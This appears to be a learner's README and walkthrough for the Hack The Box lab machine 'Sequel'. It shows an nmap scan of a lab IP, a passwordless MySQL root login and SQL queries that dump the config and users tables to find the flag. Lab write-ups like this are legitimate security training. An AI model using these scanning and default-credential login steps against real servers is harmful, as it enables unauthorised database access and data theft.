# Sequel-HackTheBox-Cybersecurity-Learning-Journey

I just solved Sequel on Hack The Box! https://labs.hackthebox.com/achievement/ma chine/3398529/403  #HackTheBox #HTB #CyberSecurity #EthicalHacking #InfoSec #PenTesting


# Hack The Box - Sequel Writeup Repository



---

# Root README.md

```markdown
## Completed Machines
- Fawn
- Dancing
- Redeemer
- Appointment
- Sequel

## Additional Skills Practiced
- MySQL / MariaDB enumeration
- Database navigation
- SQL querying
- Passwordless root access discovery
- Table/column inspection
```

---

# Sequel/writeup.md

````markdown
# Sequel - Hack The Box

## Target IP
TARGET_IP
10.129.179.209
---

## Enumeration

### Nmap Scan
```bash
nmap -sC -sV 10.129.179.209
````

### Findings

* Port 3306 open
* MySQL / MariaDB service exposed

---

## Foothold

### Connect to MySQL

```bash
mysql -h 10.129.179.209 -u root
```

### Result

* Passwordless root login successful

---

## Database Enumeration

### Show databases

```sql
SHOW DATABASES;
```

### Select HTB database

```sql
USE htb;
```

### Show tables

```sql
SHOW TABLES;
```

### Tables discovered

* config
* users

---

## Extract Data

### View config table

```sql
SELECT * FROM config;
```

### View users table

```sql
SELECT * FROM users;
```

---

## Flag

Flag found inside:
config table
config
```
colume "name"
row "5"
---

## Useful MySQL Commands

```sql
SHOW DATABASES;
USE database_name;
SHOW TABLES;
DESCRIBE table_name;
SELECT * FROM table_name;
```

---

## Lessons Learned

* MySQL service enumeration
* Database authentication weaknesses
* Passwordless administrative access
* SQL database structure
* Table and column inspection
* Manual data extraction

````


# Optional Enhancements recummended

* Add MySQL cheat sheet: https://www.mysqltutorial.org/mysql-cheat-sheet.aspx 

---

# Security Concepts Demonstrated

* Exposed database services
* Weak authentication
* Data enumeration
* Information disclosure
* SQL fundamentals

---

# Portfolio Tip

Sequel highlights:

* Database enumeration
* Service misconfiguration discovery
* SQL command proficiency
* Structured pentesting methodology

https://labs.hackthebox.com/achievement/ma
chine/3398529/402
 #HackTheBox #HTB #CyberSecurity #EthicalHacking #InfoSec #PenTesting

